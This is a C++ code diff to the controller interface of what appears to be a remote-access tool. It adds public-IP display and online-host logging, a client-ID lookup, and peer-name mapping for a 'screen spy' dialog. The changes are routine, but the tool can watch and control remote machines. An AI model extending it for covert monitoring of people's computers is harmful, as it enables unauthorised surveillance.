@@ -718,7 +718,8 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
     CString install = v[RES_INSTALL_TIME].empty() ? "?" : v[RES_INSTALL_TIME].c_str();
     CString path = v[RES_FILE_PATH].empty() ? "?" : v[RES_FILE_PATH].c_str();
     CString data[ONLINELIST_MAX] = { strIP, strAddr, "", strPCName, strOS, strCPU, strVideo, strPing,
-                                     ver, install, startTime, v[RES_CLIENT_TYPE].empty() ? "?" : v[RES_CLIENT_TYPE].c_str(), path
+                                     ver, install, startTime, v[RES_CLIENT_TYPE].empty() ? "?" : v[RES_CLIENT_TYPE].c_str(), path,
+                                     v[RES_CLIENT_PUBIP].empty() ? strIP : v[RES_CLIENT_PUBIP].c_str(),
                                    };
     auto id = CONTEXT_OBJECT::CalculateID(data);
     bool modify = false;
@@ -778,6 +779,8 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
     std::string tip = flag ? " (" + v[RES_CLIENT_PUBIP] + ") " : "";
     ShowMessage("操作成功",strIP + tip.c_str() + "主机上线");
     LeaveCriticalSection(&m_cs);
+    Mprintf("主机[%s]上线: %s\n", v[RES_CLIENT_PUBIP].empty() ? strIP : v[RES_CLIENT_PUBIP].c_str(), 
+        std::to_string(id).c_str());
 
     SendMasterSettings(ContextObject);
 }
@@ -2609,6 +2612,17 @@ context* CMy2015RemoteDlg::FindHost(int port)
     return NULL;
 }
 
+context* CMy2015RemoteDlg::FindHost(uint64_t id)
+{
+	CLock L(m_cs);
+	for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
+		if ((*i)->GetClientID() == id) {
+			return *i;
+		}
+	}
+	return NULL;
+}
+
 void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx)
 {
     BYTE buf[sizeof(MasterSettings) + 1] = { CMD_MASTERSETTING };
@@ -2659,6 +2673,11 @@ BOOL CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, 
 
 LRESULT CMy2015RemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 {
+    CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
+	LPBYTE p = ContextObject->InDeCompressedBuffer.GetBuffer(41);
+	uint64_t clientID = p ? *((uint64_t*)p) : 0;
+    auto mainCtx = clientID ? FindHost(clientID) : NULL;
+    if (mainCtx) ContextObject->SetPeerName(mainCtx->GetClientData(ONLINELIST_IP).GetString());
     return OpenDialog<CScreenSpyDlg, IDD_DIALOG_SCREEN_SPY, SW_SHOWMAXIMIZED>(wParam, lParam);
 }
 
